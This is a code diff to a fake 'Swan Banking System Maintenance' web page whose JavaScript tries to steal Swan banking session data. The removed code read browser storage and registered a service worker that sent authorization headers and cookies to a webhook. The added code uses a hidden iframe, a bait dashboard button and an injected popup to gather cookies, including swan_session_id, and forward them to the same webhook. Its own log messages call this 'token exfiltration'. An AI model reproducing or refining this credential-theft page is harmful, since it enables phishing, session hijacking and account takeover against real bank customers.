@@ -62,11 +62,24 @@
         .success { color: #27ae60; }
         .error { color: #e74c3c; }
         .info { color: #2980b9; }
+        .button {
+            display: inline-block;
+            background: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background: #2980b9;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>System Maintenance</h1>
+        <h1>Swan Banking System Maintenance</h1>
         <p>The Swan banking system is currently undergoing scheduled maintenance to improve security and performance. This process will finish automatically.</p>
         
         <div class="loading">
@@ -76,6 +89,10 @@
         </div>
         
         <p id="status">Initializing system check...</p>
+        
+        <div id="actions">
+            <a href="#" id="openDashboard" class="button">Open Swan Dashboard</a>
+        </div>
         
         <div id="log-container">
             <h3>System Log</h3>
@@ -90,6 +107,13 @@
         // DOM Elements
         const statusEl = document.getElementById('status');
         const logEl = document.getElementById('log');
+        const openDashboardBtn = document.getElementById('openDashboard');
+        
+        // Cross-tab communication key
+        const STORAGE_KEY = "swan_exfil_status";
+        
+        // Popup reference
+        let dashboardPopup = null;
         
         // Logging utility
         function log(message, type = 'info') {
@@ -153,54 +177,6 @@
         
         // EXTRACTION FUNCTIONS
         
-        // Extract localStorage items
-        function extractLocalStorage() {
-            try {
-                const data = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    data[key] = localStorage.getItem(key);
-                }
-                
-                // Immediately send to webhook
-                sendToWebhook({
-                    type: 'localStorage',
-                    data: data,
-                    timestamp: new Date().toISOString()
-                });
-                
-                log(`Extracted ${Object.keys(data).length} localStorage items`, 'success');
-                return data;
-            } catch (e) {
-                log(`Error extracting localStorage: ${e.message}`, 'error');
-                return {};
-            }
-        }
-        
-        // Extract sessionStorage items
-        function extractSessionStorage() {
-            try {
-                const data = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    data[key] = sessionStorage.getItem(key);
-                }
-                
-                // Immediately send to webhook
-                sendToWebhook({
-                    type: 'sessionStorage',
-                    data: data,
-                    timestamp: new Date().toISOString()
-                });
-                
-                log(`Extracted ${Object.keys(data).length} sessionStorage items`, 'success');
-                return data;
-            } catch (e) {
-                log(`Error extracting sessionStorage: ${e.message}`, 'error');
-                return {};
-            }
-        }
-        
         // Extract cookies
         function extractCookies() {
             try {
@@ -237,204 +213,271 @@
             }
         }
         
-        // Extract all tokens and send immediately
-        function extractAllTokens() {
-            log('Extracting all tokens...');
+        // CROSS-TAB COMMUNICATION METHODS
+        
+        // Method 1: LocalStorage Event Listener for Cross-Tab Communication
+        function setupLocalStorageListener() {
+            log('Setting up localStorage listener for cross-tab communication...');
             
-            // Extract and send each storage type separately
-            const localStorage = extractLocalStorage();
-            const sessionStorage = extractSessionStorage();
-            const cookies = extractCookies();
-            
-            // Also send a combined report
-            sendToWebhook({
-                type: 'all_tokens',
-                localStorage: localStorage,
-                sessionStorage: sessionStorage,
-                cookies: cookies,
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
+            // Listen for storage events (triggered when another tab modifies localStorage)
+            window.addEventListener('storage', function(event) {
+                if (event.key === STORAGE_KEY) {
+                    log('Detected cross-tab communication via localStorage', 'success');
+                    
+                    // Extract cookies immediately when user returns from dashboard
+                    setTimeout(function() {
+                        log('User returned from dashboard, extracting cookies...');
+                        extractCookies();
+                    }, 500);
+                }
             });
             
-            log('All tokens extracted and sent', 'success');
+            log('LocalStorage listener active', 'success');
         }
         
-        // Try to extract tokens from dashboard.swan.io via iframe
-        function tryDashboardIframe() {
-            log('Attempting to access dashboard.swan.io via iframe...');
+        // Method 2: Open Dashboard in Popup Window
+        function openDashboardPopup() {
+            log('Opening dashboard.swan.io in popup window...');
             
             try {
+                // Open popup
+                dashboardPopup = window.open('https://dashboard.swan.io/', 'SwanDashboard', 
+                    'width=1000,height=800,resizable=yes,scrollbars=yes');
+                
+                if (!dashboardPopup || dashboardPopup.closed || typeof dashboardPopup.closed === 'undefined') {
+                    log('Popup was blocked by browser', 'error');
+                    return false;
+                }
+                
+                log('Dashboard popup opened', 'success');
+                
+                // Set up interval to check if popup is closed
+                const popupCheckInterval = setInterval(function() {
+                    if (dashboardPopup.closed) {
+                        clearInterval(popupCheckInterval);
+                        log('Dashboard popup closed, extracting cookies...');
+                        extractCookies();
+                        
+                        // Signal to other tabs
+                        localStorage.setItem(STORAGE_KEY, Date.now().toString());
+                    }
+                }, 1000);
+                
+                return true;
+            } catch (e) {
+                log(`Error opening popup: ${e.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // Method 3: Create Hidden Iframe with Polling
+        function createHiddenIframe() {
+            log('Creating hidden iframe to dashboard.swan.io...');
+            
+            try {
+                // Create iframe
                 const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
+                iframe.style.width = '0';
+                iframe.style.height = '0';
+                iframe.style.border = 'none';
+                iframe.style.position = 'absolute';
+                iframe.style.top = '-9999px';
+                iframe.style.left = '-9999px';
                 iframe.src = 'https://dashboard.swan.io/';
                 
-                iframe.onload = function() {
-                    log('Iframe loaded, attempting to extract tokens...');
-                    
+                // Add to document
+                document.body.appendChild(iframe);
+                
+                log('Hidden iframe created, waiting for load...');
+                
+                // Set up polling to check for cookies
+                const pollInterval = setInterval(function() {
                     try {
-                        // This will likely fail due to same-origin policy
+                        // This will throw an error due to same-origin policy
                         const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        const iframeCookies = iframeDoc.cookie;
+                        log('Successfully accessed iframe content (unexpected)', 'success');
+                    } catch (e) {
+                        // Expected error due to same-origin policy
+                        // But we can still check our own cookies
+                        extractCookies();
+                    }
+                }, 2000);
+                
+                // Clean up after 30 seconds
+                setTimeout(function() {
+                    clearInterval(pollInterval);
+                    try {
+                        document.body.removeChild(iframe);
+                    } catch (e) {}
+                    log('Iframe polling completed');
+                }, 30000);
+                
+                return true;
+            } catch (e) {
+                log(`Error creating iframe: ${e.message}`, 'error');
+                return false;
+            }
+        }
+        
+        // Method 4: Create Injected Dashboard Link
+        function createInjectedLink() {
+            log('Creating dashboard link with injected code...');
+            
+            // The URL to open
+            const dashboardUrl = 'https://dashboard.swan.io/';
+            
+            // Update the link
+            openDashboardBtn.href = dashboardUrl;
+            openDashboardBtn.target = '_blank';
+            openDashboardBtn.rel = 'opener';
+            
+            // Add click handler
+            openDashboardBtn.addEventListener('click', function(e) {
+                // Don't prevent default - we want the link to open
+                
+                // Set a flag in localStorage that we're expecting to extract cookies soon
+                localStorage.setItem(STORAGE_KEY, 'pending');
+                
+                log('Dashboard link clicked, waiting for user to return...');
+                
+                // Start checking for cookies periodically
+                const checkInterval = setInterval(function() {
+                    extractCookies();
+                }, 5000);
+                
+                // Stop checking after 5 minutes
+                setTimeout(function() {
+                    clearInterval(checkInterval);
+                    log('Cookie extraction timeout reached');
+                }, 5 * 60 * 1000);
+            });
+            
+            log('Dashboard link prepared with cookie extraction', 'success');
+            return true;
+        }
+        
+        // Method 5: Create Popup with Controlled Closure
+        function setupPopupWithCallback() {
+            log('Setting up popup with controlled closure...');
+            
+            // Replace the default link behavior
+            openDashboardBtn.href = '#';
+            openDashboardBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Create a popup
+                const popup = window.open('about:blank', 'SwanDashboard', 
+                    'width=1000,height=800,resizable=yes,scrollbars=yes');
+                
+                if (!popup || popup.closed || typeof popup.closed === 'undefined') {
+                    log('Popup was blocked by browser', 'error');
+                    return;
+                }
+                
+                // Inject code into the popup that will navigate to dashboard and set up communication
+                popup.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Redirecting to Swan Dashboard...</title>
+                        <script>
+                            // Function to extract cookies and send back to opener
+                            function extractAndSendCookies() {
+                                try {
+                                    // Get all cookies
+                                    const cookies = {};
+                                    document.cookie.split(';').forEach(cookie => {
+                                        if (cookie.trim()) {
+                                            const [name, value] = cookie.trim().split('=');
+                                            cookies[name] = value;
+                                        }
+                                    });
+                                    
+                                    // Send to opener window
+                                    if (window.opener && !window.opener.closed) {
+                                        window.opener.postMessage({
+                                            type: 'cookies',
+                                            data: cookies
+                                        }, '*');
+                                    }
+                                } catch (e) {
+                                    console.error('Error extracting cookies:', e);
+                                }
+                            }
+                            
+                            // Set up message event listener
+                            window.addEventListener('message', function(event) {
+                                if (event.data === 'extract_cookies') {
+                                    extractAndSendCookies();
+                                }
+                            });
+                            
+                            // Set up beforeunload to extract cookies when closing
+                            window.addEventListener('beforeunload', function() {
+                                extractAndSendCookies();
+                            });
+                            
+                            // Navigate to dashboard
+                            window.location.href = 'https://dashboard.swan.io/';
+                        </script>
+                    </head>
+                    <body>
+                        <h1>Redirecting to Swan Dashboard...</h1>
+                    </body>
+                    </html>
+                `);
+                
+                // Close the document to finish writing
+                popup.document.close();
+                
+                // Set up message event listener to receive cookies from popup
+                window.addEventListener('message', function(event) {
+                    if (event.data && event.data.type === 'cookies') {
+                        log('Received cookies from popup', 'success');
                         
+                        // Send to webhook
                         sendToWebhook({
-                            type: 'iframe_cookies',
-                            data: iframeCookies,
+                            type: 'popup_cookies',
+                            data: event.data.data,
                             timestamp: new Date().toISOString()
                         });
                         
-                        log('Successfully extracted cookies from iframe', 'success');
-                    } catch (e) {
-                        log(`Cannot access iframe content: ${e.message}`, 'error');
-                    }
-                    
-                    // Remove iframe after attempt
-                    document.body.removeChild(iframe);
-                };
-                
-                document.body.appendChild(iframe);
-            } catch (e) {
-                log(`Error creating iframe: ${e.message}`, 'error');
-            }
-        }
-        
-        // Register service worker to intercept requests
-        async function registerServiceWorker() {
-            if (!('serviceWorker' in navigator)) {
-                log('Service Worker not supported', 'error');
-                return;
-            }
-            
-            try {
-                log('Registering service worker...');
-                
-                // Create service worker code
-                const swCode = `
-                    // Service Worker for Swan.io token exfiltration
-                    const WEBHOOK_URL = "${WEBHOOK_URL}";
-                    
-                    // Listen for fetch events
-                    self.addEventListener('fetch', event => {
-                        const url = new URL(event.request.url);
-                        
-                        // Only intercept Swan.io requests
-                        if (url.hostname.includes('swan.io')) {
-                            // Clone the request to read headers
-                            const requestClone = event.request.clone();
-                            
-                            event.waitUntil(async function() {
-                                try {
-                                    // Extract headers
-                                    const headers = {};
-                                    requestClone.headers.forEach((value, key) => {
-                                        headers[key.toLowerCase()] = value;
-                                    });
-                                    
-                                    // Send all headers to webhook
-                                    fetch(WEBHOOK_URL, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            type: 'request_headers',
-                                            url: url.toString(),
-                                            headers: headers,
-                                            timestamp: new Date().toISOString()
-                                        }),
-                                        mode: 'no-cors'
-                                    });
-                                    
-                                    // Specifically look for auth headers
-                                    if (headers.authorization) {
-                                        fetch(WEBHOOK_URL, {
-                                            method: 'POST',
-                                            headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({
-                                                type: 'authorization_header',
-                                                url: url.toString(),
-                                                authorization: headers.authorization,
-                                                timestamp: new Date().toISOString()
-                                            }),
-                                            mode: 'no-cors'
-                                        });
-                                    }
-                                    
-                                    // Look for cookies
-                                    if (headers.cookie) {
-                                        fetch(WEBHOOK_URL, {
-                                            method: 'POST',
-                                            headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({
-                                                type: 'request_cookies',
-                                                url: url.toString(),
-                                                cookies: headers.cookie,
-                                                timestamp: new Date().toISOString()
-                                            }),
-                                            mode: 'no-cors'
-                                        });
-                                    }
-                                } catch (e) {
-                                    // Silent failure
-                                }
-                            }());
+                        // Special handling for swan_session_id
+                        if (event.data.data['swan_session_id']) {
+                            sendToWebhook({
+                                type: 'swan_session_id',
+                                data: event.data.data['swan_session_id'],
+                                timestamp: new Date().toISOString()
+                            });
+                            log(`Found swan_session_id from popup: ${event.data.data['swan_session_id'].substring(0, 10)}...`, 'success');
                         }
-                    });
-                    
-                    // Take control immediately
-                    self.addEventListener('install', event => {
-                        self.skipWaiting();
-                    });
-                    
-                    self.addEventListener('activate', event => {
-                        event.waitUntil(self.clients.claim());
-                    });
-                `;
-                
-                // Create blob URL for service worker
-                const blob = new Blob([swCode], { type: 'application/javascript' });
-                const swUrl = URL.createObjectURL(blob);
-                
-                // Register service worker
-                const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' });
-                log(`Service worker registered with scope: ${registration.scope}`, 'success');
-                
-                // Send confirmation to webhook
-                sendToWebhook({
-                    type: 'service_worker_registered',
-                    scope: registration.scope,
-                    timestamp: new Date().toISOString()
+                    }
                 });
-            } catch (e) {
-                log(`Service worker registration failed: ${e.message}`, 'error');
                 
-                // Send error to webhook
-                sendToWebhook({
-                    type: 'service_worker_error',
-                    error: e.message,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }
-        
-        // Make a test request to Swan.io to trigger service worker
-        function makeTestRequest() {
-            log('Making test request to Swan.io...');
-            
-            fetch('https://api.swan.io/admin/graphql', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    query: '{ __typename }'
-                })
-            }).catch(e => {
-                // Ignore errors, we just want to trigger the service worker
+                // Periodically ask popup for cookies
+                const extractInterval = setInterval(function() {
+                    if (popup && !popup.closed) {
+                        try {
+                            popup.postMessage('extract_cookies', '*');
+                        } catch (e) {
+                            // Ignore cross-origin errors
+                        }
+                    } else {
+                        clearInterval(extractInterval);
+                        log('Popup closed, stopping cookie extraction');
+                    }
+                }, 5000);
+                
+                log('Popup opened with cookie extraction', 'success');
             });
+            
+            log('Popup with callback setup complete', 'success');
+            return true;
         }
         
         // Main execution
         async function main() {
-            log('Starting token exfiltration...');
+            log('Starting cross-tab token exfiltration...');
             
             // Send initial ping to webhook
             sendToWebhook({
@@ -444,25 +487,26 @@
                 timestamp: new Date().toISOString()
             });
             
-            // 1. Extract all tokens immediately
-            extractAllTokens();
+            // 1. Extract cookies from current page
+            extractCookies();
             
-            // 2. Try to access dashboard.swan.io via iframe
-            tryDashboardIframe();
+            // 2. Set up cross-tab communication
+            setupLocalStorageListener();
             
-            // 3. Register service worker
-            await registerServiceWorker();
+            // 3. Create hidden iframe for background extraction
+            createHiddenIframe();
             
-            // 4. Make a test request to trigger service worker
-            setTimeout(makeTestRequest, 1000);
+            // 4. Set up popup with controlled closure
+            setupPopupWithCallback();
             
             // 5. Update status
             updateStatus('System check complete');
-            log('Token exfiltration complete', 'success');
+            log('Token exfiltration setup complete', 'success');
+            log('Click "Open Swan Dashboard" to continue', 'info');
             
             // 6. Send completion notification
             sendToWebhook({
-                type: 'exfiltration_complete',
+                type: 'exfiltration_setup_complete',
                 url: window.location.href,
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
